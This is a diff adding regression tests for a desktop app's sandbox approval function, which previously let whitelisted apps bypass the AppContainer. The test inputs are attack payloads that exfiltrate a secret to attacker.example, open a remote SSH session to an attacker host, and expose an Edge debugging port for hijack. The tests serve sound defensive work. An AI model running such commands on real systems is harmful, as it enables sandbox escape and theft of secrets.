@@ -4,7 +4,7 @@
  * Tests pure functions and regex patterns used in sandbox-preload.js
  * and main.ts for permission management.
  */
-import { describe, it, expect, beforeEach, afterEach } from "vitest";
+import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import path from "path";
 
 // ── likelyNeedsElevation heuristic ──
@@ -2460,6 +2460,116 @@ describe("checkApproval — no auto-bypass for whitelisted apps", () => {
     expect(checkApproval("Start-Process powershell")).toBe("none");
     expect(checkApproval("Start-Process cmd")).toBe("none");
     expect(checkApproval("Start-Process node")).toBe("none");
+  });
+});
+
+// ── Regression: checkApproval (production code path, real module) ──
+//
+// The describe block above asserts the *intent* of checkApproval against a
+// local stub defined inside the test. The real implementation lives in
+// appcontainer/sandbox-cp-hooks.js and previously contained a fast-path
+// that silently returned "bypass" whenever the launched app matched the
+// default whitelist in desktop/src/main.ts (chrome, msedge, firefox, code,
+// outlook, excel, winword, powerpnt). The stub-based tests passed even
+// while production-`checkApproval` was bypassing the AppContainer for
+// every default-whitelisted external-app launch — including parametrised
+// attack payloads like `code --remote ssh-remote+attacker@…`.
+//
+// The tests in this block exercise the real production function so a
+// future regression that re-introduces a silent-bypass branch will fail
+// CI rather than being masked by a local-stub test.
+
+describe("checkApproval (production code path, real module)", () => {
+  // eslint-disable-next-line @typescript-eslint/no-require-imports
+  const cpHooks = require("../../appcontainer/sandbox-cp-hooks.js");
+  // eslint-disable-next-line @typescript-eslint/no-require-imports
+  const perm = require("../../appcontainer/sandbox-permission.js");
+
+  const DEFAULT_WHITELIST = () => [
+    "outlook",
+    "excel",
+    "winword",
+    "powerpnt",
+    "chrome",
+    "msedge",
+    "firefox",
+    "code",
+  ];
+
+  let requestApprovalSpy: ReturnType<typeof vi.spyOn>;
+
+  beforeEach(() => {
+    requestApprovalSpy = vi.spyOn(perm, "requestApproval").mockReturnValue("deny");
+  });
+
+  afterEach(() => {
+    requestApprovalSpy.mockRestore();
+  });
+
+  it("does NOT auto-bypass whitelisted 'code' (covers default-whitelist sandbox escape)", () => {
+    const result = cpHooks.checkApproval(
+      "cmd.exe",
+      ["/c", "Start-Process code"],
+      DEFAULT_WHITELIST,
+    );
+    expect(requestApprovalSpy).toHaveBeenCalled();
+    expect(result).not.toBe("bypass");
+  });
+
+  it("does NOT auto-bypass `code --remote ssh-remote+attacker` (attack vector)", () => {
+    const payload = "Start-Process code --remote ssh-remote+attacker@example.com /tmp/payload.sh";
+    const result = cpHooks.checkApproval("cmd.exe", ["/c", payload], DEFAULT_WHITELIST);
+    expect(requestApprovalSpy).toHaveBeenCalled();
+    expect(result).not.toBe("bypass");
+  });
+
+  it("does NOT auto-bypass `chrome` data-exfil URL", () => {
+    const payload = "Start-Process chrome https://attacker.example/collect?secret=foo";
+    const result = cpHooks.checkApproval("cmd.exe", ["/c", payload], DEFAULT_WHITELIST);
+    expect(requestApprovalSpy).toHaveBeenCalled();
+    expect(result).not.toBe("bypass");
+  });
+
+  it("does NOT auto-bypass `msedge --remote-debugging-port` (CDP hijack)", () => {
+    const payload =
+      "Start-Process msedge --remote-debugging-port=9222 --user-data-dir=C:\\Temp\\evil";
+    const result = cpHooks.checkApproval(
+      "powershell.exe",
+      ["-Command", payload],
+      DEFAULT_WHITELIST,
+    );
+    expect(requestApprovalSpy).toHaveBeenCalled();
+    expect(result).not.toBe("bypass");
+  });
+
+  it("denied approval results in 'sandbox' (not 'bypass'), confirming control flow", () => {
+    requestApprovalSpy.mockReturnValue("deny");
+    const result = cpHooks.checkApproval(
+      "cmd.exe",
+      ["/c", "Start-Process code"],
+      DEFAULT_WHITELIST,
+    );
+    expect(result).toBe("sandbox");
+  });
+
+  it("approved-once still returns 'bypass' (the only legitimate bypass path remains intact)", () => {
+    requestApprovalSpy.mockReturnValue("allow-once");
+    const result = cpHooks.checkApproval(
+      "cmd.exe",
+      ["/c", "Start-Process code"],
+      DEFAULT_WHITELIST,
+    );
+    expect(result).toBe("bypass");
+  });
+
+  it("non-app commands return 'none' regardless of whitelist", () => {
+    const result = cpHooks.checkApproval(
+      "cmd.exe",
+      ["/c", "Get-ChildItem C:\\Users"],
+      DEFAULT_WHITELIST,
+    );
+    expect(requestApprovalSpy).not.toHaveBeenCalled();
+    expect(result).toBe("none");
   });
 });
 
